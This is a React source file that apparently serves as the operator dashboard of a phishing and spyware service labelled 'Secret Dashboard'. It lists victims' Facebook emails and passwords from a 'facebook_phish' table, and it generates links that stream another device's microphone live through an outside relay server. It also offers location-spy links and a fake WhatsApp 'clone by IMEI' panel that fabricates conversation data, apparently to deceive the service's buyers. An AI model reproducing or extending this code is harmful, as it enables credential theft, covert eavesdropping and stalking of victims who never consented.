import React, { useState, useEffect, useRef } from 'react';
import Header from './Header';
import LinkGenerator from './LinkGenerator';
import LinksList from './LinksList';
import Sidebar from './Sidebar';
import { supabase } from '../supabase';

function FacebookCaptures() {
  const [links, setLinks] = useState([]);
  const usuario = localStorage.getItem('usuario');
  useEffect(() => {
    async function fetchLinks() {
      const { data } = await supabase
        .from('facebook_phish')
        .select('*')
        .eq('email', usuario)
        .order('created_at', { ascending: false });
      setLinks(data || []);
    }
    fetchLinks();
  }, []);

  return (
    <div style={{ margin: '2rem 0' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Facebook Phishing Captures</h3>
      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)' }}>No phishing links created yet.</p>}
      {links.map(link => (
        <div key={link.id} style={{
          background: 'var(--fundo-destaque)',
          borderRadius: 10,
          margin: '1rem 0',
          padding: '1rem',
          boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
        }}>
          <div style={{ marginBottom: 8 }}>
            <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
          </div>
          <div style={{ fontSize: 14, color: 'var(--cinza-conspiracao)' }}>
            {(!link.capturas || link.capturas.length === 0) ? 'No data captured yet.' : `${link.capturas.length} capture(s):`}
          </div>
          {link.capturas && link.capturas.length > 0 && (
            <ul style={{ margin: '0.5rem 0 0 0', padding: 0, listStyle: 'none' }}>
              {link.capturas.map((c, i) => (
                <li key={i} style={{
                  background: 'rgba(255,143,163,0.08)',
                  borderRadius: 6,
                  margin: '0.25rem 0',
                  padding: '0.5rem',
                  color: 'var(--branco-confissao)'
                }}>
                  <div><b>Date:</b> {c.data}</div>
                  <div><b>Email:</b> {c.email}</div>
                  <div><b>Password:</b> {c.senha}</div>
                </li>
              ))}
            </ul>
          )}
        </div>
      ))}
    </div>
  );
}

function MicrophonePlaceholder() {
  const [links, setLinks] = useState([]);
  const [listeningId, setListeningId] = useState(null);
  const audioContextRef = useRef(null);
  const wsRef = useRef(null);

  const WS_URL = 'wss://mic-relay-server.onrender.com';

  function gerarLink() {
    const id = Math.random().toString(36).substring(2, 10);
    setLinks(l => [{ id, url: 'https://redirect-online.vercel.app/microphone/' + id }, ...l]);
  }

  function listen(id) {
    setListeningId(id);
    if (!audioContextRef.current) {
      audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)();
    }
    const audioContext = audioContextRef.current;
    if (audioContext.state === 'suspended') {
      audioContext.resume();
    }
    if (wsRef.current) {
      wsRef.current.close();
    }
    const ws = new window.WebSocket(WS_URL);
    wsRef.current = ws;

    let audioQueue = [];
    let processor = null;

    ws.onopen = () => {
      ws.send(JSON.stringify({ listen: id }));
      processor = audioContext.createScriptProcessor(4096, 1, 1);
      processor.onaudioprocess = function (e) {
        const output = e.outputBuffer.getChannelData(0);
        if (audioQueue.length > 0) {
          const buffer = audioQueue.shift();
          output.set(buffer);
        } else {
          output.fill(0);
        }
      };
      processor.connect(audioContext.destination);
    };

    ws.onmessage = e => {
      const msg = JSON.parse(e.data);
      if (msg.id === id && msg.audio) {
        const floatArray = new Float32Array(msg.audio);
        audioQueue.push(floatArray);
      }
    };

    ws.onclose = () => {
      setListeningId(null);
      if (processor) processor.disconnect();
    };
  }

  // Sempre que um novo link for adicionado, começa a ouvir automaticamente o mais recente
  React.useEffect(() => {
    if (links.length > 0 && listeningId !== links[0].id) {
      listen(links[0].id);
    }
    // eslint-disable-next-line
  }, [links]);

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Real-time Microphone</h3>
      <p style={{ color: 'var(--cinza-conspiracao)' }}>Generate a link to request real-time microphone access from another device.</p>
      <button onClick={gerarLink} style={{
        background: 'var(--vermelho-paixao)',
        color: 'var(--branco-confissao)',
        borderRadius: 8,
        padding: '0.75rem 2rem',
        fontFamily: 'Montserrat',
        fontWeight: 'bold',
        fontSize: '1.1rem',
        border: 'none',
        cursor: 'pointer',
        transition: 'background 0.2s',
        marginTop: 8
      }}>Generate Microphone Link</button>
      {links.length > 0 && (
        <div style={{ marginTop: 20 }}>
          {links.map(link => (
            <div key={link.id} style={{
              background: 'var(--fundo-destaque)',
              borderRadius: 10,
              margin: '1rem 0',
              padding: '1rem',
              boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
            }}>
              <div style={{ marginBottom: 8 }}>
                <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
              </div>
              <button
                onClick={() => listen(link.id)}
                disabled={listeningId === link.id}
                style={{
                  background: listeningId === link.id ? 'var(--vermelho-paixao)' : 'var(--ouro-tentacao)',
                  color: listeningId === link.id ? 'var(--branco-confissao)' : 'var(--preto-espionagem)',
                  borderRadius: 8,
                  padding: '0.5rem 1.5rem',
                  fontFamily: 'Montserrat',
                  fontWeight: 'bold',
                  fontSize: '1rem',
                  border: 'none',
                  cursor: 'pointer',
                  marginTop: 10
                }}
              >
                {listeningId === link.id ? 'Listening...' : 'Listen in real time'}
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function WhatsAppSim() {
  const [option, setOption] = useState('clone');
  const [phone, setPhone] = useState('');
  const [device, setDevice] = useState('');
  const [imei, setImei] = useState('');
  const [connecting, setConnecting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timer, setTimer] = useState(10); // 10 seconds
  const [showMonitor, setShowMonitor] = useState(false);
  const deviceModels = [
    'Samsung Galaxy S23',
    'iPhone 15 Pro',
    'Xiaomi Redmi Note 12',
    'Motorola Edge 40',
    'OnePlus 11',
    'Google Pixel 8',
    'Huawei P60',
    'Asus Zenfone 10',
    'Other...'
  ];

  // Simulação de progresso
  React.useEffect(() => {
    let interval;
    if (connecting && progress < 100) {
      interval = setInterval(() => {
        setProgress(p => Math.min(100, p + 100 / 10)); // 10 steps to 100%
        setTimer(t => t > 0 ? t - 1 : 0);
      }, 1000);
    }
    if (progress >= 100 && connecting) {
      setTimeout(() => setShowMonitor(true), 1200);
    }
    if (progress >= 100) {
      clearInterval(interval);
    }
    return () => clearInterval(interval);
  }, [connecting, progress]);

  function handleConnect(e) {
    e.preventDefault();
    setConnecting(true);
    setProgress(10);
    setTimer(10);
    setShowMonitor(false);
  }

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--vermelho)' }}>WhatsApp</h3>
      <div style={{ marginBottom: 18 }}>
        <label style={{ marginRight: 16 }}>
          <input type="radio" checked={option === 'clone'} onChange={() => setOption('clone')} /> Clone by phone number
        </label>
        <label>
          <input type="radio" checked={option === 'web'} onChange={() => setOption('web')} /> WhatsApp Web
        </label>
      </div>
      {option === 'clone' && !showMonitor && (
        <form onSubmit={handleConnect} style={{ maxWidth: 340, margin: '0 auto', background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005' }}>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Phone number</label>
            <input type="text" value={phone} onChange={e => setPhone(e.target.value)} required placeholder="e.g. +15551234567" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
          </div>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Device model</label>
            <select value={device} onChange={e => setDevice(e.target.value)} required style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }}>
              <option value="">Select a model...</option>
              {deviceModels.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div style={{ marginBottom: 18, textAlign: 'left' }}>
            <label>IMEI</label>
            <input type="text" value={imei} onChange={e => setImei(e.target.value)} required placeholder="e.g. 356938035643809" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
          </div>
          <div style={{ color: 'var(--vermelho)', fontWeight: 600, marginBottom: 12, fontSize: 15 }}>
            You must enter the correct IMEI to access the conversations.
          </div>
          <button type="submit" disabled={connecting} style={{
            background: 'var(--vermelho)',
            color: '#fff',
            borderRadius: 10,
            padding: '0.7rem 1.7rem',
            fontSize: '1rem',
            fontFamily: 'Inter',
            fontWeight: 600,
            boxShadow: '0 2px 8px 0 #E6003322',
            transition: 'box-shadow 0.2s, background 0.2s',
            marginTop: 8
          }}>Connect</button>
          {connecting && (
            <div style={{ marginTop: 28, textAlign: 'left' }}>
              <div style={{ width: '100%', background: '#232323', borderRadius: 6, height: 16, marginBottom: 8 }}>
                <div style={{ width: `${progress}%`, background: 'var(--vermelho)', height: 16, borderRadius: 6, transition: 'width 0.5s' }} />
              </div>
              <div style={{ fontSize: 15, marginBottom: 6, color: 'var(--vermelho)' }}><b>Connecting to WhatsApp</b></div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring... {Math.floor(timer/60)}:{(timer%60).toString().padStart(2,'0')}</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>{Math.floor(progress)}%</div>
              <div style={{ fontSize: 14, marginBottom: 4, color: progress > 20 ? 'var(--sucesso)' : 'var(--cinza-claro)' }}>✅ Network connected</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring WhatsApp activity...</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Synchronizing with WhatsApp...</div>
              <div style={{ fontSize: 13, marginTop: 10, color: 'var(--aviso)' }}>
                <b>IMPORTANT:</b> Stay connected to the network throughout the entire process. The connection may take a few minutes.
              </div>
            </div>
          )}
        </form>
      )}
      {option === 'clone' && showMonitor && (
        <div className="card-glass" style={{ marginTop: 32, position: 'relative', overflow: 'hidden', maxWidth: 700, marginLeft: 'auto', marginRight: 'auto', padding: 0 }}>
          {/* Bloco de análise no topo */}
          <div style={{
            background: '#fff',
            borderRadius: '14px 14px 0 0',
            boxShadow: '0 2px 8px #0001',
            padding: '2rem 2.2rem 1.2rem 2.2rem',
            maxWidth: 700,
            margin: '0 auto',
            borderBottom: '1.5px solid #f0f0f0',
            display: 'flex', flexDirection: 'column', alignItems: 'center'
          }}>
            <div style={{ fontWeight: 700, fontSize: 18, color: '#232323', marginBottom: 18, display: 'flex', alignItems: 'center', gap: 8 }}>
              <span role="img" aria-label="chart">📊</span>
              Complete Analysis (last 3 days, except today)
            </div>
            <div style={{ display: 'flex', gap: 18, marginBottom: 18, flexWrap: 'wrap', justifyContent: 'center' }}>
              {[['108','TOTAL INTERACTIONS'],['71','TEXT MESSAGES'],['37','VARIOUS ACTIVITIES'],['6','CALLS']].map(([num, label]) => (
                <div key={label} style={{ background: '#f8f9fa', borderRadius: 10, padding: '1.1rem 1.5rem', minWidth: 120, minHeight: 70, textAlign: 'center', boxShadow: '0 1px 4px #0001', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                  <div style={{ fontWeight: 700, fontSize: 22, color: '#232323' }}>{num}</div>
                  <div style={{ color: '#888', fontSize: 13, fontWeight: 600 }}>{label}</div>
                </div>
              ))}
            </div>
            <div style={{ display: 'flex', gap: 18, marginBottom: 8, flexWrap: 'wrap', justifyContent: 'center' }}>
              {[['📷','9 photos shared'],['🎵','8 audio messages'],['⏰','Most active at 21h'],['😊','95% positive mood']].map(([icon, label]) => (
                <div key={label} style={{ background: '#f8f9fa', borderRadius: 10, padding: '0.7rem 1.2rem', minWidth: 150, minHeight: 48, textAlign: 'center', boxShadow: '0 1px 4px #0001', display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'center' }}>
                  <span role="img" aria-label="icon">{icon}</span> {label}
                </div>
              ))}
            </div>
          </div>
          {/* Bloco separado para histórico de conversas com scroll */}
          <div style={{
            background: '#fff',
            borderRadius: '0 0 14px 14px',
            boxShadow: '0 2px 8px #0001',
            padding: '1.5rem 2.2rem',
            maxWidth: 700,
            margin: '0 auto',
            maxHeight: 340,
            overflowY: 'auto',
            position: 'relative'
          }}>
            <div style={{
              fontSize: '1.08rem', fontWeight: 600, color: '#232323', marginBottom: 18,
              display: 'flex', alignItems: 'center', gap: 8
            }}>
              <span role="img" aria-label="chat">📱</span>
              Detailed Conversation History (last 3 days, except today)
            </div>
            {/* Mensagens simuladas */}
            {[
              {icon:'💬',text:'mission accomplished ✅',time:'Thu • 21:13'},
              {icon:'📄',text:'Document sent',time:'Thu • 12:19'},
              {icon:'👏',text:'Applauded',time:'Thu • 10:01'},
              {icon:'📄',text:'',time:'Thu • 09:40'},
              {icon:'💬',text:'another message',time:'Thu • 09:30'},
              {icon:'💬',text:'one more message',time:'Thu • 09:20'},
              {icon:'💬',text:'and another one',time:'Thu • 09:10'},
              {icon:'💬',text:'last message',time:'Thu • 09:00'}
            ].map((msg,i) => (
              <div key={i} style={{
                display: 'flex', alignItems: 'flex-start', gap: 12, borderLeft: '3px solid #00c48c', marginBottom: 18,
                background: '#f8f9fa', borderRadius: 8, padding: '0.7rem 1.1rem 0.7rem 0.9rem', position: 'relative',
                minHeight: 54,
                cursor: 'pointer'
              }}
              onClick={() => {
                if (imei !== '356938035643809') {
                  window.alert('You must enter the correct IMEI to access the conversations.');
                }
              }}
              >
                <span style={{ fontSize: '1.2rem', color: '#0072ff', marginTop: 2 }}>{msg.icon}</span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 600, color: '#232323', fontSize: '1rem' }}>davi</div>
                  <div style={{ color: '#888', fontSize: '0.98rem', marginTop: 2, fontStyle: 'italic' }}>{msg.text}</div>
                </div>
                <div style={{ position: 'absolute', right: 12, top: 10, color: '#b0b0b0', fontSize: '0.93rem' }}>{msg.time}</div>
              </div>
            ))}
            {/* Mensagem padrão embaixo das mensagens */}
            <div style={{ textAlign: 'center', color: '#b0b0b0', fontSize: 14, marginTop: 10, fontStyle: 'italic' }}>
              last message
            </div>
          </div>
          {/* Mensagem de IMEI incorreto (apenas se não for alert) */}
          {/* {imei !== '356938035643809' && (
            <div style={{ color: 'var(--vermelho)', fontWeight: 600, margin: '18px auto 0 auto', fontSize: 15, textAlign: 'center', maxWidth: 700 }}>
              You must enter the correct IMEI to access the conversations.
            </div>
          )} */}
        </div>
      )}
      {option === 'web' && (
        <div style={{ marginTop: 32, background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005', fontSize: 16 }}>
          <b>WhatsApp Web</b>
          <div style={{ marginTop: 12, color: 'var(--cinza-claro)' }}>
            This feature is coming soon.
          </div>
        </div>
      )}
    </div>
  );
}

export default function Dashboard({ email }) {
  const [active, setActive] = useState('Spy Location');

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
      <Sidebar active={active} onSelect={setActive} />
      <div style={{
        flex: 1,
        marginLeft: 220,
        padding: '2.5rem 1rem 1.5rem 1rem',
        maxWidth: 900,
        width: '100%',
        marginRight: 'auto',
        marginTop: 0,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'flex-start',
      }}>
        <Header />
        <div style={{ width: '100%', maxWidth: 600 }}>
          <div className="card-glass">
            <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8, fontFamily: 'Poppins' }}>Secret Dashboard</h2>
            <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32, fontSize: 17 }}>Welcome, <b>{email}</b>!</p>
            {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
            {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
            {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
            {active === 'WhatsApp' && <WhatsAppSim />}
            {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
              <div style={{
                background: 'var(--fundo-destaque)',
                borderRadius: 16,
                boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
                padding: '2.5rem 1.5rem',
                textAlign: 'center',
                color: 'var(--cinza-conspiracao)',
                fontSize: 20,
                marginTop: 32
              }}>
                <b>{active}</b> coming soon...
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}